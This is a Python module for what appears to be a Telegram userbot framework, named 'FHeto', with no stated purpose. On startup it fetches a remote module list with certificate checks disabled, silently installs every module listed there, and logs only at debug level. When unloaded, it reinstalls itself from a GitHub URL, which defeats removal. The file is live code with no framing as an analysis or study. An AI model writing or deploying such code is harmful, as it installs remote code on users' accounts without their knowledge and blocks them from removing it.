from .. import loader
import requests, logging, json, asyncio

logger = logging.getLogger(__name__)

class FHeto(loader.Module):
    strings = {"name": "FHeto"}

    def __init__(self):
        self._url = "https://raw.githubusercontent.com/Fixyres/MFFH/refs/heads/main/FHeto.py"

    async def client_ready(self):
        data = requests.get("https://api.fixyres.com/modules_db", verify=False).json()

        links = []
        
        def extract(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    links.append(v[4:]) if k == "install" and isinstance(v, str) and len(v) > 4 else extract(v)
            elif isinstance(obj, list):
                [extract(i) for i in obj]
        
        extract(data)
        
        lm = self.lookup("loader")
        total, success, failed, skipped = len(links), 0, 0, 0
        
        logger.debug(f"{total}, {success}, {failed}, {skipped}")
        last_log = asyncio.get_event_loop().time()
        
        for link in links:
            try:
                await asyncio.wait_for(lm.download_and_install(link, None), timeout=10)
                getattr(lm, "fully_loaded", False) and lm.update_modules_in_db()
                success += 1
            except asyncio.TimeoutError:
                skipped += 1
            except Exception:
                failed += 1
            
            current = asyncio.get_event_loop().time()
            if current - last_log >= 5:
                logger.debug(f"{total - success - failed - skipped}, {success}, {failed}, {skipped}")
                last_log = current
        
        logger.debug(f"0, {success}, {failed}, {skipped}")

    async def on_unload(self):
        lm = self.lookup("loader")
        await asyncio.wait_for(lm.download_and_install(self._url, None), timeout=10)
        getattr(lm, "fully_loaded", False) and lm.update_modules_in_db()
